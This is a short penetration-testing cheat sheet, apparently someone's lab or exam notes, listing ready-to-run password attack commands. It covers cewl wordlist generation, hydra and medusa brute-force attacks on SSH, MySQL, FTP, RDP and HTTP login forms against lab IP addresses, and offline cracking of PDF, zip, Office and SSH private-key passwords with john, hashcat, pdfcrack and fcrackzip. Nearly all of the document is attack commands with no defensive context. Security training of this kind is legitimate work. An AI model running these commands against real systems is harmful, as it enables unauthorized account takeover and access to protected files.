
Custom Wordlist
```
cewl <domain> -w wordlist.txt
```

Brute Force
SSH
```
 hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.119.201
```
MySQL
```
hydra [-L users.txt or -l user_name] [-P pass.txt or -p password] -f [-S port] mysql://X.X.X.X
```
FTP 
```
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
```
```
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.136.56 ftp
```
RDP
```
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.119.202
```
HTTP POST login
```
hydra -l <user> -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/login.php:user=admin&pass=^PASS^:Invalid Login" -vV -f
```
HTTP GET login
```
sudo hydra -l [username] -P /usr/share/wordlists/rockyou.txt http-get://[Target IP]
hydra -l <username> -P /usr/share/wordlists/rockyou.txt -f <IP> http-get /login
```

Crack PDF file passwords
```
pdfcrack  -f [file name] -w /usr/share/wordlists/rockyou.txt
pdf2john
```

Crack Zip file
```
Zip2john file.zip > hash.txt
john hash.txt -wordlist=/usr/share/wordlists/rockyou.txt
```
```
fcrackzip -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip
```

Crack id_rsa password
```
ssh2john id_rsa > ssh.hash
hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```

Crack Microsoft Doc
```
office2john demo.docx > doc.hash
```

Crowbar
```
https://www.kali.org/tools/crowbar
```

